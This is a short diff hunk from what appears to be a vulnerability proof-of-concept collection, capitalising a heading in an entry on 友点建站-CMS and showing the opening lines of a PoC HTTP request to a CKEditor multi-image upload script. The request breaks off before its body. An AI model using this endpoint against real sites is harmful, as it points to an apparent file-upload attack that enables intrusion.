@@ -7,7 +7,7 @@ app="友点建站-CMS"
 ```
 
 
-## poc
+## POC
 ```
 POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
 Host: 127.0.0.1
